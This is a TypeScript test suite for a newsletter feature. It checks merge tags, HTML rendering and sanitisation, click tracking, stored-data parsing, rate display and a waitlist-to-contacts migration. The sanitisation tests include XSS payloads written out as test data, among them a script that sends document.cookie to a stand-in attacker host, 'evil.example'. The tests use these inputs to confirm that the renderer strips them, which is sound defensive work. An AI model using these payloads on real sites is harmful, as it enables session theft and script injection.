/**
 * NEWSLETTER — the parts that are wrong silently.
 *
 * A mailing is the one feature in this product with no undo. Everything below
 * is a rule whose violation would not raise, would not fail a build, and would
 * only be visible in somebody else's inbox:
 *
 *   A. MERGE TAGS. "Cześć ," is the classic broken mailing, and it always
 *      happens to the contact who never typed a first name.
 *   B. RENDERING. The unsubscribe line and the text part are not the author's
 *      to remove, and a pasted HTML document is not allowed to bring script
 *      with it.
 *   C. LINK TRACKING. The renderer looks links up by their FINAL utm-tagged
 *      form. If the snapshot registers the untagged one, every lookup misses,
 *      every href silently falls back to the plain destination and click
 *      tracking is off for the whole campaign while the UI still says it is on.
 *   D. HONEST NUMBERS. A rate with no denominator is not 0 %, it is unknown,
 *      and the difference decides whether an operator trusts the dashboard.
 *
 * Run: npm run test:newsletter
 */
import { readFileSync } from "node:fs";
import {
  applyMerge, usedMergeFields, unknownMergeTags, toBlocks, toAudience, toUtm,
  toSegmentRules, rate, formatRate, BLOCK_TYPES, MERGE_FIELDS,
} from "../lib/newsletter";
import { renderCampaign, collectUrls } from "../lib/server/newsletter/render";

let failures = 0;
function check(name: string, cond: boolean, detail?: string) {
  if (cond) console.log(`  ✓ ${name}`);
  else { failures++; console.error(`  ✗ ${name}${detail !== undefined ? ` — ${detail}` : ""}`); }
}

/* ═══════════════════════════════════════════════════════════════════════ */
console.log("A. MERGE TAGS");

check("a value is substituted",
  applyMerge("Cześć {{first_name}}!", { first_name: "Ala" }) === "Cześć Ala!");
check("a missing value falls back to the author's default",
  applyMerge('Cześć {{first_name | default:"Kliencie"}}!', {}) === "Cześć Kliencie!");
check("an empty value is treated as missing, not as empty",
  applyMerge('Cześć {{first_name | default:"Kliencie"}}!', { first_name: "   " }) === "Cześć Kliencie!");
check("with no default and no value the tag disappears rather than printing itself",
  applyMerge("Cześć {{first_name}}", {}) === "Cześć ");
check("whitespace inside the braces does not break the tag",
  applyMerge("{{  first_name  }}", { first_name: "Ala" }) === "Ala");
check("a tag is case-insensitive",
  applyMerge("{{First_Name}}", { first_name: "Ala" }) === "Ala");

// THE ONE THAT MATTERS: a typo must be visible, not swallowed.
check("a misspelled tag is left on screen so the author can see it",
  applyMerge("Cześć {{frist_name}}", { first_name: "Ala" }) === "Cześć {{frist_name}}");
check("…and is reported by name", unknownMergeTags("{{frist_name}} {{email}}").join() === "frist_name");
check("the tags actually used are reported",
  usedMergeFields("{{first_name}} {{email}} {{first_name}}").sort().join() === "email,first_name");

check("every documented field is substitutable",
  MERGE_FIELDS.every((f) => applyMerge(`{{${f}}}`, { [f]: "X" } as never) === "X"),
  MERGE_FIELDS.join());

/* ═══════════════════════════════════════════════════════════════════════ */
console.log("\nB. WHAT AN AUTHOR CANNOT REMOVE");

const BASE = {
  subject: "Temat",
  preheader: "Zajawka",
  merge: { first_name: "Ala" },
  unsubscribeUrl: "https://grovbase.com/wypisz-sie/abc",
  locale: "pl",
};

const builder = renderCampaign({
  ...BASE,
  editor: "builder" as const,
  blocks: [
    { id: "1", type: "heading", text: "Cześć {{first_name}}" },
    { id: "2", type: "text", text: "Pierwszy akapit.\n\nDrugi akapit." },
    { id: "3", type: "button", label: "Kup", url: "https://grovbase.com/cennik" },
  ],
  bodyHtml: "",
});

check("the unsubscribe link is in the HTML whatever the author wrote",
  builder.html.includes("https://grovbase.com/wypisz-sie/abc"));
check("…and in the plain-text part too",
  builder.text.includes("https://grovbase.com/wypisz-sie/abc"));
check("a text/plain alternative always exists", builder.text.trim().length > 0);
check("the merge tag is applied in the body", builder.html.includes("Cześć Ala"));
check("the subject is merged as well",
  renderCampaign({ ...BASE, subject: "Cześć {{first_name}}", editor: "builder", blocks: [], bodyHtml: "" })
    .subject === "Cześć Ala");
check("a newline in a subject is flattened, not carried into a header",
  renderCampaign({ ...BASE, subject: "A\r\nB", editor: "builder", blocks: [], bodyHtml: "" })
    .subject === "A B");
check("the document declares a charset", builder.html.includes('charset="utf-8"'));
check("the preheader is present but hidden",
  builder.html.includes("Zajawka") && builder.html.includes("display:none"));

// HOSTILE INPUT. A first name comes from a public form; it reaches an inbox
// and, every time somebody previews, this app's own admin origin.
const hostile = renderCampaign({
  ...BASE,
  merge: { first_name: '<img src=x onerror="alert(1)">' },
  editor: "builder" as const,
  blocks: [{ id: "1", type: "heading", text: "Cześć {{first_name}}" }],
  bodyHtml: "",
});
// The escaped text legitimately CONTAINS the characters `onerror=`; what must
// not exist is a tag. Asserting on the substring would pass for the wrong
// reason and fail for the right one.
check("a hostile first name renders as text, never as a tag",
  !/<img[^>]*onerror/i.test(hostile.html) && hostile.html.includes("&lt;img"),
  hostile.html.slice(hostile.html.indexOf("Cześć"), hostile.html.indexOf("Cześć") + 90));

// PASTED HTML. §24 allows a whole document and forbids JavaScript.
const pasted = renderCampaign({
  ...BASE,
  editor: "html" as const,
  blocks: [],
  bodyHtml: `<html><body><h1>Oferta</h1>
    <script>fetch("https://evil.example/"+document.cookie)</script>
    <p onclick="alert(1)">Tekst</p>
    <a href="javascript:alert(1)">zły link</a>
    <a href="https://grovbase.com/cennik">dobry link</a>
    <iframe src="https://evil.example"></iframe></body></html>`,
});
check("a pasted <script> never reaches the message", !pasted.html.includes("<script"));
check("…nor does its payload", !pasted.html.includes("evil.example/"));
check("an inline event handler is stripped", !pasted.html.includes("onclick"));
check("a javascript: link is stripped", !pasted.html.toLowerCase().includes("javascript:"));
check("an iframe is stripped", !pasted.html.includes("<iframe"));
check("the legitimate content survives", pasted.html.includes("Oferta") && pasted.html.includes("Tekst"));
check("the legitimate link survives", pasted.html.includes("https://grovbase.com/cennik"));
check("a pasted document still gets the unsubscribe footer",
  pasted.html.includes("https://grovbase.com/wypisz-sie/abc"));
check("a pasted document still gets a text part", pasted.text.includes("Oferta"));

/* ═══════════════════════════════════════════════════════════════════════ */
console.log("\nC. LINK TRACKING RESOLVES");

const BODY = {
  editor: "builder" as const,
  blocks: [
    { id: "1", type: "button", label: "Kup", url: "https://grovbase.com/cennik" },
    { id: "2", type: "social", label: "Instagram", url: "https://instagram.com/grovbase" },
  ],
  bodyHtml: "",
};
const UTM = { source: "grovbase", medium: "email", campaign: "premiera" };

const urls = collectUrls(BODY, UTM);
check("every destination in the body is collected", urls.length === 2, urls.join(" "));
check("collected urls carry the campaign's utm tags",
  urls.every((u) => u.includes("utm_campaign=premiera")), urls.join(" "));

// THE REGRESSION THIS SECTION EXISTS FOR: the map is keyed by what collectUrls
// returns, and the renderer must find every one of those keys.
const links = new Map(urls.map((u, i) => [u, `link-${i}`]));
const tracked = renderCampaign({
  ...BASE,
  ...BODY,
  tracking: {
    origin: "https://grovbase.com",
    recipientId: "rcp-1",
    links,
    trackOpens: true,
    trackClicks: true,
    utm: UTM,
  },
});
check("every collected link is rewritten through the redirect endpoint",
  urls.every((_, i) => tracked.html.includes(`/r/rcp-1/link-${i}`)),
  tracked.html.match(/href="[^"]*"/g)?.join(" ") ?? "");
check("no raw destination is left behind when tracking is on",
  !tracked.html.includes('href="https://grovbase.com/cennik'),
  tracked.html.match(/href="[^"]*"/g)?.join(" ") ?? "");
check("the open pixel is present when opens are tracked",
  tracked.html.includes("/api/newsletter/open/rcp-1.png"));

// The unsubscribe link must NOT be rewritten: a tracker in front of the one
// legal exit is both rude and fragile.
check("the unsubscribe link is never rewritten through the tracker",
  tracked.html.includes("https://grovbase.com/wypisz-sie/abc"));

const untracked = renderCampaign({ ...BASE, ...BODY });
check("with tracking off nothing is rewritten",
  untracked.html.includes('href="https://grovbase.com/cennik"'));
check("…and there is no pixel", !untracked.html.includes("/api/newsletter/open/"));

// An operator who tagged a link by hand meant it.
const handTagged = collectUrls(
  { editor: "builder", blocks: [{ id: "1", type: "button", label: "X", url: "https://grovbase.com/a?utm_campaign=moja" }], bodyHtml: "" },
  UTM,
);
check("a hand-written utm tag is not overwritten",
  handTagged[0].includes("utm_campaign=moja") && !handTagged[0].includes("utm_campaign=premiera"),
  handTagged.join());

check("a mailto: link is left alone",
  renderCampaign({
    ...BASE,
    editor: "html",
    blocks: [],
    bodyHtml: '<a href="mailto:kontakt@grovbase.com">napisz</a>',
    tracking: { origin: "https://grovbase.com", recipientId: "r", links: new Map(), trackOpens: false, trackClicks: true },
  }).html.includes("mailto:kontakt@grovbase.com"));

/* ═══════════════════════════════════════════════════════════════════════ */
console.log("\nD. STORED SHAPES SURVIVE AN OLDER WRITER");

check("an unknown block type is dropped rather than rendered blank",
  toBlocks([{ type: "hero" }, { type: "text", text: "x" }]).length === 1);
check("every declared block type round-trips",
  toBlocks(BLOCK_TYPES.map((t) => ({ type: t }))).length === BLOCK_TYPES.length);
check("a non-array blocks value is not a crash", toBlocks("nonsense").length === 0);
check("blocks get ids even when stored without one",
  toBlocks([{ type: "text" }])[0].id === "b0");

check("an audience with junk in it is emptied, not trusted",
  toAudience({ include: ["a", 7, null], exclude: "no" }).include.join() === "a");
check("utm values are trimmed and capped",
  toUtm({ source: "  x  ", medium: "" }).source === "x" && toUtm({ medium: "" }).medium === undefined);
check("segment rules default to AND", toSegmentRules({}).match === "all");
check("an unknown segment field is discarded",
  toSegmentRules({ conditions: [{ field: "salary", value: "1" }, { field: "source", value: "x" }] })
    .conditions.length === 1);
check("segment conditions are capped",
  toSegmentRules({ conditions: Array.from({ length: 40 }, () => ({ field: "source", value: "x" })) })
    .conditions.length === 12);

/* ═══════════════════════════════════════════════════════════════════════ */
console.log("\nE. A RATE WITH NO DENOMINATOR IS UNKNOWN, NOT ZERO");

check("no recipients means no open rate", rate(0, 0) === null);
check("…and it prints as a dash, not 0 %", formatRate(rate(0, 0)) === "—");
check("a real rate is a real number", Math.round(rate(19, 100) as number) === 19);
check("zero of many is a genuine zero", rate(0, 100) === 0);
check("a zero rate prints as 0,0%", formatRate(0) === "0,0%");

/* ═══════════════════════════════════════════════════════════════════════ */
console.log("\nZ. THE WAITLIST IS THE CONTACT LIST");

/*
  WHY THIS SECTION EXISTS, IN ONE SENTENCE: the newsletter shipped with 77
  passing tests and showed "0 kontaktów" in production for two weeks, because
  nothing asserted that the launch page and the newsletter were the same list.

  Every check below pins one link in that chain. They read the migration and
  the code rather than the database, because a test cannot reach production —
  but each one names the production fact it stands for, and those facts were
  verified by counting rows on PROD before this was written:
  8 waitlist + 9 accounts - 3 overlapping = 14 contacts, 9 linked, 2 consented,
  0 duplicates.
*/

const merge = readFileSync("supabase/migrations/0097_newsletter_contact_merge.sql", "utf8");
const nav = readFileSync("lib/navigation.ts", "utf8");
const navUi = readFileSync("components/admin/newsletter/nav.tsx", "utf8");
const picker = readFileSync("components/admin/newsletter/range-picker.tsx", "utf8");
const panel = readFileSync("components/admin/newsletter/sending-panel.tsx", "utf8");
const actions = readFileSync("app/actions/newsletter.ts", "utf8");
const waitlistPage = readFileSync("app/admin/waitlist/page.tsx", "utf8");

// A. A launch-page signup becomes a newsletter contact.
check("waitlist_subscribe feeds the newsletter",
  /create or replace function public\.waitlist_subscribe[\s\S]*?newsletter_upsert_contact/.test(merge));
// Before the early 'exists' return, or a repeat signup — which is every
// address that predates this migration — would never become a contact.
check("…before the 'exists' return, so a repeat signup still lands",
  merge.indexOf("p_source_key := 'waitlist'") < merge.indexOf("jsonb_build_object('status', 'exists')"));
// A fault in the contact write must not cost the lead already captured.
check("…and a fault there cannot lose the signup",
  /perform public\.newsletter_upsert_contact\([\s\S]{0,600}?exception when others then/.test(merge));

// B. The rows that were already there.
check("the existing waitlist is backfilled",
  /from public\.waitlist_subscribers\s+order by created_at asc/.test(merge));
check("…carrying the original date, not the migration's",
  /p_created_at := r\.created_at/.test(merge));

// C. One address, one contact.
check("the normalised address is unique in the database",
  /create unique index[\s\S]{0,120}newsletter_contacts \(lower\(email\)\)/.test(merge));
check("…and the upsert looks a contact up that way",
  /where lower\(email\) = v_email/.test(merge));

// D. Waitlist then account is one contact with two sources.
check("sources are recorded per contact, not overwritten",
  /create table if not exists public\.newsletter_contact_sources/.test(merge)
  && /on conflict \(contact_id, source_key\) do update/.test(merge));
check("…and an account link never replaces an existing one",
  /user_id\s*=\s*coalesce\(user_id, p_user_id\)/.test(merge));

// E. THE RULE THAT MATTERS MOST. An account is not a consent.
check("the account backfill passes no consent",
  /p_source_key := 'account'[\s\S]{0,400}?p_created_at := r\.created_at/.test(merge)
  && !/p_source_key := 'account'[\s\S]{0,400}?p_consent\s*:=\s*true/.test(merge));
check("…and consent can only ever go up in the upsert",
  /marketing_consent = marketing_consent or v_consent/.test(merge));

// F. The old screen is gone from the menu but not from the web.
check("Lista oczekujących is out of the admin menu",
  !/"\/admin\/waitlist"/.test(nav));
check("…and /admin/waitlist redirects into the contact list",
  /redirect\("\/admin\/newsletter\/kontakty\?source=waitlist"\)/.test(waitlistPage));

// G. THE ELLIPSIS. Four equal columns plus truncate is what produced "Pul…".
check("the phone tabs are not forced into equal columns",
  !/min-w-0 flex-1 justify-center/.test(navUi));
check("…and their labels are never truncated",
  !/<span className="truncate">\{t\(`newsletter\.nav/.test(navUi));
check("…the row scrolls instead, with the selected tab pulled into view",
  /overflow-x-auto/.test(navUi) && /scrollIntoView/.test(navUi));

// H. All time means unbounded, not a made-up start date.
check("the range picker offers Cały okres", /data-range="all"/.test(picker));
check("…which resolves to no lower bound at all",
  /key: "all", since: null/.test(readFileSync("lib/newsletter.ts", "utf8")));
check("…and the query leaves the bound off rather than inventing one",
  /sinceIso === null \? upper : upper\.gte/.test(readFileSync("lib/services/newsletter.ts", "utf8")));

// I + J. The scheduler says what is wrong AND can fix it.
check("an unconfigured scheduler still fails loudly", /data-scheduler-down/.test(panel));
check("…and now offers the fix rather than only naming it",
  /data-scheduler-fix/.test(panel) && /provisionSchedulerAction/.test(panel));
check("…which derives both values server-side and returns neither",
  /dispatchToken\(\)/.test(actions)
  && /putSecret\(supabase, "grovbase\.newsletter\.worker_url"/.test(actions)
  && /putSecret\(supabase, "grovbase\.newsletter\.worker_token"/.test(actions));
// The token must never travel back to the browser.
check("…and never hands the token to the client",
  !/data:\s*\{[^}]*token/.test(actions.slice(actions.indexOf("provisionSchedulerAction"))));

/* ═══════════════════════════════════════════════════════════════════════ */
console.log(failures === 0 ? "\nAll newsletter tests passed." : `\n${failures} check(s) failed.`);
process.exit(failures === 0 ? 0 : 1);
